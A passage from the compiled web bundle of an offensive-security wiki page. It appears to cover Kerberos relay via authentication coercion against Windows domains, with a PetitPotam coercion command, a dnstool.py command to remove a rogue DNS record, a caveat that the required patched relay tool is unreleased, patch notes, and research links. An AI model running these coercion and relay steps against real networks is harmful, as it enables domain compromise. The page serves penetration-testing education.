<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">petitpotam.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$USER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PASSWORD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DOMAIN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$TARGET_FQDN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span></code></pre></div><div class="caution custom-block"><p>Clean up the rogue DNS record after the test:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dnstool.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DOMAIN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\\\</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$USER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PASSWORD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DC_IP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --action</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> remove</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tcp</span></span></code></pre></div></div><div class="warning custom-block"><p>The modified <code>krbrelayx.py</code> required to reproduce this technique (patched to relay the AP-REQ despite hostname mismatch) had <strong>not been released publicly</strong> at the time of writing <em>(June 2026)</em>. The steps above reflect the described attack flow but cannot be fully executed without that tool. Follow <a href="https://www.synacktiv.com/publications" target="_blank" rel="noreferrer">Synacktiv&#39;s publications</a> and the <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx repository</a> to stay informed about any future release, and feel free to contribute by opening a PR in the krbrelayx repository.</p></div><div class="note custom-block"><p>The patches were released on March 2026 Patch Tuesday. The list of affected versions and corresponding KBs is available on the Microsoft Security Response Center: <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-58726" target="_blank" rel="noreferrer">CVE-2025-58726</a> and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-26128" target="_blank" rel="noreferrer">CVE-2026-26128</a>.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html" target="_blank" rel="noreferrer">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p><p><a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6" target="_blank" rel="noreferrer">https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/</a></p><p><a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx" target="_blank" rel="noreferrer">https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx</a></p><p><a href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with" target="_blank" rel="noreferrer">https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with</a></p><p><a href="https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1" target="_blank" rel="noreferrer">https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1</a></p><p><a href="https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part" target="_blank" rel="noreferrer">https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part</a></p>`,71)]))}const g=t(n,[["render",r]]);export{k as __pageData,g as default};
